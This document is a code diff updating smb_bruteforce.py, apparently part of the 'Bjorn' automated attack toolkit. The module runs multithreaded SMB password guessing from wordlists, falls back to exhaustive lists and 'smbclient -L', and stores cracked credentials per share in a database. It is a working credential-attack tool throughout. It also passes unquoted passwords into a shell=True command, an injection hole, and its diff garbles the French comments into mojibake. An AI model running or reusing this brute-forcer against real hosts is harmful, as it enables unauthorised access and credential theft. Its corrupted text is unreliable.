@@ -1,8 +1,8 @@
-"""
-smb_bruteforce.py — SMB bruteforce (DB-backed, no CSV/JSON, no rich)
-- Cibles fournies par l’orchestrateur (ip, port)
+﻿"""
+smb_bruteforce.py â€” SMB bruteforce (DB-backed, no CSV/JSON, no rich)
+- Cibles fournies par lâ€™orchestrateur (ip, port)
 - IP -> (MAC, hostname) depuis DB.hosts
-- Succès enregistrés dans DB.creds (service='smb'), 1 ligne PAR PARTAGE (database=<share>)
+- SuccÃ¨s enregistrÃ©s dans DB.creds (service='smb'), 1 ligne PAR PARTAGE (database=<share>)
 - Conserve la logique de queue/threads et les signatures. Plus de rich/progress.
 """
 
@@ -10,12 +10,13 @@ import os
 import threading
 import logging
 import time
-from subprocess import Popen, PIPE
+from subprocess import Popen, PIPE, TimeoutExpired
 from smb.SMBConnection import SMBConnection
 from queue import Queue
 from typing import List, Dict, Tuple, Optional
 
 from shared import SharedData
+from actions.bruteforce_common import ProgressTracker, merged_password_plan
 from logger import Logger
 
 logger = Logger(name="smb_bruteforce.py", level=logging.DEBUG)
@@ -47,19 +48,20 @@ class SMBBruteforce:
         return self.smb_bruteforce.run_bruteforce(ip, port)
 
     def execute(self, ip, port, row, status_key):
-        """Point d’entrée orchestrateur (retour 'success' / 'failed')."""
+        """Point d'entrÃ©e orchestrateur (retour 'success' / 'failed')."""
         self.shared_data.bjorn_orch_status = "SMBBruteforce"
+        self.shared_data.comment_params = {"user": "?", "ip": ip, "port": str(port)}
         success, results = self.bruteforce_smb(ip, port)
         return 'success' if success else 'failed'
 
 
 class SMBConnector:
-    """Gère les tentatives SMB, la persistance DB et le mapping IP→(MAC, Hostname)."""
+    """GÃ¨re les tentatives SMB, la persistance DB et le mapping IPâ†’(MAC, Hostname)."""
 
     def __init__(self, shared_data):
         self.shared_data = shared_data
 
-        # Wordlists inchangées
+        # Wordlists inchangÃ©es
         self.users = self._read_lines(shared_data.users_file)
         self.passwords = self._read_lines(shared_data.passwords_file)
 
@@ -70,6 +72,7 @@ class SMBConnector:
         self.lock = threading.Lock()
         self.results: List[List[str]] = []  # [mac, ip, hostname, share, user, password, port]
         self.queue = Queue()
+        self.progress = None
 
     # ---------- util fichiers ----------
     @staticmethod
@@ -115,8 +118,9 @@ class SMBConnector:
     # ---------- SMB ----------
     def smb_connect(self, adresse_ip: str, user: str, password: str) -> List[str]:
         conn = SMBConnection(user, password, "Bjorn", "Target", use_ntlm_v2=True)
+        timeout = int(getattr(self.shared_data, "smb_connect_timeout_s", 6))
         try:
-            conn.connect(adresse_ip, 445)
+            conn.connect(adresse_ip, 445, timeout=timeout)
             shares = conn.listShares()
             accessible = []
             for share in shares:
@@ -127,7 +131,7 @@ class SMBConnector:
                     accessible.append(share.name)
                     logger.info(f"Access to share {share.name} successful on {adresse_ip} with user '{user}'")
                 except Exception as e:
-                    logger.error(f"Error accessing share {share.name} on {adresse_ip} with user '{user}': {e}")
+                    logger.debug(f"Error accessing share {share.name} on {adresse_ip} with user '{user}': {e}")
             try:
                 conn.close()
             except Exception:
@@ -137,10 +141,22 @@ class SMBConnector:
             return []
 
     def smbclient_l(self, adresse_ip: str, user: str, password: str) -> List[str]:
+        timeout = int(getattr(self.shared_data, "smb_connect_timeout_s", 6))
         cmd = f'smbclient -L {adresse_ip} -U {user}%{password}'
+        process = None
         try:
             process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
-            stdout, stderr = process.communicate()
+            try:
+                stdout, stderr = process.communicate(timeout=timeout)
+            except TimeoutExpired:
+                try:
+                    process.kill()
+                except Exception:
+                    pass
+                try:
+                    stdout, stderr = process.communicate(timeout=2)
+                except Exception:
+                    stdout, stderr = b"", b""
             if b"Sharename" in stdout:
                 logger.info(f"Successful auth for {adresse_ip} with '{user}' using smbclient -L")
                 return self.parse_shares(stdout.decode(errors="ignore"))
@@ -150,6 +166,23 @@ class SMBConnector:
         except Exception as e:
             logger.error(f"Error executing '{cmd}': {e}")
             return []
+        finally:
+            if process:
+                try:
+                    if process.poll() is None:
+                        process.kill()
+                except Exception:
+                    pass
+                try:
+                    if process.stdout:
+                        process.stdout.close()
+                except Exception:
+                    pass
+                try:
+                    if process.stderr:
+                        process.stderr.close()
+                except Exception:
+                    pass
 
     @staticmethod
     def parse_shares(smbclient_output: str) -> List[str]:
@@ -216,10 +249,13 @@ class SMBConnector:
                                 continue
                             self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
                             logger.success(f"Found credentials IP:{adresse_ip} | User:{user} | Share:{share}")
+                        self.shared_data.comment_params = {"user": user, "ip": adresse_ip, "port": str(port), "share": shares[0] if shares else ""}
                     self.save_results()
                     self.removeduplicates()
                     success_flag[0] = True
             finally:
+                if self.progress is not None:
+                    self.progress.advance(1)
                 self.queue.task_done()
 
                 # Optional delay between attempts
@@ -228,69 +264,82 @@ class SMBConnector:
 
 
     def run_bruteforce(self, adresse_ip: str, port: int):
+        self.results = []
         mac_address = self.mac_for_ip(adresse_ip)
         hostname = self.hostname_for_ip(adresse_ip) or ""
 
-        total_tasks = len(self.users) * len(self.passwords)
+        dict_passwords, fallback_passwords = merged_password_plan(self.shared_data, self.passwords)
+        total_tasks = len(self.users) * (len(dict_passwords) + len(fallback_passwords) + len(dict_passwords))
         if total_tasks == 0:
             logger.warning("No users/passwords loaded. Abort.")
             return False, []
 
-        for user in self.users:
-            for password in self.passwords:
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
-                    return False, []
-                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
-
+        self.progress = ProgressTracker(self.shared_data, total_tasks)
         success_flag = [False]
-        threads = []
-        thread_count = min(40, max(1, total_tasks))
 
-        for _ in range(thread_count):
-            t = threading.Thread(target=self.worker, args=(success_flag,), daemon=True)
-            t.start()
-            threads.append(t)
-
-        while not self.queue.empty():
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                while not self.queue.empty():
-                    try:
-                        self.queue.get_nowait()
-                        self.queue.task_done()
-                    except Exception:
-                        break
-                break
-
-        self.queue.join()
-        for t in threads:
-            t.join()
-
-        # Fallback smbclient -L si rien trouvé
-        if not success_flag[0]:
-            logger.info(f"No success via SMBConnection. Trying smbclient -L for {adresse_ip}")
+        def run_primary_phase(passwords):
+            phase_tasks = len(self.users) * len(passwords)
+            if phase_tasks == 0:
+                return
             for user in self.users:
-                for password in self.passwords:
-                    shares = self.smbclient_l(adresse_ip, user, password)
-                    if shares:
-                        with self.lock:
-                            for share in shares:
-                                if share in IGNORED_SHARES:
-                                    continue
-                                self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
-                                logger.success(f"(SMB) Found credentials IP:{adresse_ip} | User:{user} | Share:{share} via smbclient -L")
-                            self.save_results()
-                            self.removeduplicates()
-                            success_flag[0] = True
-                    if getattr(self.shared_data, "timewait_smb", 0) > 0:
-                        time.sleep(self.shared_data.timewait_smb)
+                for password in passwords:
+                    if self.shared_data.orchestrator_should_exit:
+                        logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
+                        return
+                    self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
 
-        return success_flag[0], self.results
+            threads = []
+            thread_count = min(8, max(1, phase_tasks))
+            for _ in range(thread_count):
+                t = threading.Thread(target=self.worker, args=(success_flag,), daemon=True)
+                t.start()
+                threads.append(t)
+
+            self.queue.join()
+            for t in threads:
+                t.join()
+
+        try:
+            run_primary_phase(dict_passwords)
+
+            if (not success_flag[0]) and fallback_passwords and not self.shared_data.orchestrator_should_exit:
+                logger.info(
+                    f"SMB dictionary phase failed on {adresse_ip}:{port}. "
+                    f"Starting exhaustive fallback ({len(fallback_passwords)} passwords)."
+                )
+                run_primary_phase(fallback_passwords)
+
+            # Keep smbclient -L fallback on dictionary passwords only (cost control).
+            if not success_flag[0] and not self.shared_data.orchestrator_should_exit:
+                logger.info(f"No success via SMBConnection. Trying smbclient -L for {adresse_ip}")
+                for user in self.users:
+                    for password in dict_passwords:
+                        shares = self.smbclient_l(adresse_ip, user, password)
+                        if self.progress is not None:
+                            self.progress.advance(1)
+                        if shares:
+                            with self.lock:
+                                for share in shares:
+                                    if share in IGNORED_SHARES:
+                                        continue
+                                    self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
+                                    logger.success(
+                                        f"(SMB) Found credentials IP:{adresse_ip} | User:{user} | Share:{share} via smbclient -L"
+                                    )
+                                self.save_results()
+                                self.removeduplicates()
+                                success_flag[0] = True
+                        if getattr(self.shared_data, "timewait_smb", 0) > 0:
+                            time.sleep(self.shared_data.timewait_smb)
+
+            self.progress.set_complete()
+            return success_flag[0], self.results
+        finally:
+            self.shared_data.bjorn_progress = ""
 
     # ---------- persistence DB ----------
     def save_results(self):
-        # insère self.results dans creds (service='smb'), database = <share>
+        # insÃ¨re self.results dans creds (service='smb'), database = <share>
         for mac, ip, hostname, share, user, password, port in self.results:
             try:
                 self.shared_data.db.insert_cred(
@@ -315,12 +364,12 @@ class SMBConnector:
         self.results = []
 
     def removeduplicates(self):
-        # plus nécessaire avec l'index unique; conservé pour compat.
+        # plus nÃ©cessaire avec l'index unique; conservÃ© pour compat.
         pass
 
 
 if __name__ == "__main__":
-    # Mode autonome non utilisé en prod; on laisse simple
+    # Mode autonome non utilisÃ© en prod; on laisse simple
     try:
         sd = SharedData()
         smb_bruteforce = SMBBruteforce(sd)
@@ -329,3 +378,4 @@ if __name__ == "__main__":
     except Exception as e:
         logger.error(f"Error: {e}")
         exit(1)
+
